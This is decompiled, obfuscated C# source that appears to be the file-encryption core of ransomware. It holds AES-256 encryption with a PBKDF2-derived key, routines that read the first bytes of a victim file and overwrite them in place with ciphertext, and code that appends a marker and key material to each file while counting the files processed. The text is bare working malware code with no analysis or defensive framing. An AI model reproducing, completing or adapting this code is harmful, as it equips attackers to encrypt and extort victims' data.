using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace edKqEixVoGgLte;

public static class LDPlsTBlRKl
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] zJqyRuuOKNq(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = CXbWzpvxpwadw(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes CXbWzpvxpwadw(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] SIHltLKinis(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (opmuuofbUtOT.qpGYoLASDOB == getString_0(107397254))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (opmuuofbUtOT.TiKXhRWKbmQI)
			{
				try
				{
					File.AppendAllText(opmuuofbUtOT.NPfFzxrRnHyw, getString_0(107391226) + string_0 + getString_0(107406400) + ex.Message + getString_0(107396632));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void okTfVuvniFE(string jOuMeXrLMdE, byte[] QdqaaPMDvE, byte[] WchFjUVPKuFtkL = null)
	{
		try
		{
			byte[] array = null;
			if (opmuuofbUtOT.qpGYoLASDOB == getString_0(107397254))
			{
				array = (opmuuofbUtOT.hWWikjLPcgd ? Encoding.ASCII.GetBytes(opmuuofbUtOT.HVpeMrZfkFlb(opmuuofbUtOT.akiIqstUMMsd) + opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107406342)) + Convert.ToString(opmuuofbUtOT.lULwGORTHsVbwb) + opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107406342))) : Encoding.ASCII.GetBytes(opmuuofbUtOT.HVpeMrZfkFlb(opmuuofbUtOT.akiIqstUMMsd) + opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107406383)) + Convert.ToString(opmuuofbUtOT.lULwGORTHsVbwb) + opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107406383))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(jOuMeXrLMdE, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(QdqaaPMDvE, 0, QdqaaPMDvE.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(jOuMeXrLMdE, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!opmuuofbUtOT.hWWikjLPcgd)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(WchFjUVPKuFtkL, 0, WchFjUVPKuFtkL.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (opmuuofbUtOT.hWWikjLPcgd ? Encoding.ASCII.GetBytes(opmuuofbUtOT.HVpeMrZfkFlb(opmuuofbUtOT.akiIqstUMMsd) + opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107406342)) + Convert.ToString(opmuuofbUtOT.lULwGORTHsVbwb) + opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107406342))) : Encoding.ASCII.GetBytes(opmuuofbUtOT.HVpeMrZfkFlb(opmuuofbUtOT.akiIqstUMMsd) + opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107406383)) + Convert.ToString(opmuuofbUtOT.lULwGORTHsVbwb) + opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107406383))));
				FileStream fileStream2 = new FileStream(jOuMeXrLMdE, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(QdqaaPMDvE, 0, QdqaaPMDvE.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(jOuMeXrLMdE, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!opmuuofbUtOT.hWWikjLPcgd)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(WchFjUVPKuFtkL, 0, WchFjUVPKuFtkL.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			opmuuofbUtOT.LhieCrHWKTUqOfg++;
		}
		catch (Exception ex)
		{
			if (opmuuofbUtOT.TiKXhRWKbmQI)
			{
				try
				{
					File.AppendAllText(opmuuofbUtOT.NPfFzxrRnHyw, getString_0(107391226) + jOuMeXrLMdE + getString_0(107406333) + ex.Message + getString_0(107396632));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (opmuuofbUtOT.hWWikjLPcgd ? Encoding.ASCII.GetBytes(opmuuofbUtOT.HVpeMrZfkFlb(opmuuofbUtOT.akiIqstUMMsd) + opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107406342)) + Convert.ToString(opmuuofbUtOT.lULwGORTHsVbwb) + opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107406342))) : Encoding.ASCII.GetBytes(opmuuofbUtOT.HVpeMrZfkFlb(opmuuofbUtOT.akiIqstUMMsd) + opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107406383)) + Convert.ToString(opmuuofbUtOT.lULwGORTHsVbwb) + opmuuofbUtOT.HVpeMrZfkFlb(getString_0(107406383))));
			FileStream fileStream4 = new FileStream(jOuMeXrLMdE, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(QdqaaPMDvE, 0, QdqaaPMDvE.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(jOuMeXrLMdE, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!opmuuofbUtOT.hWWikjLPcgd)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(WchFjUVPKuFtkL, 0, WchFjUVPKuFtkL.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static LDPlsTBlRKl()
	{
		Strings.CreateGetStringDelegate(typeof(LDPlsTBlRKl));
	}
}
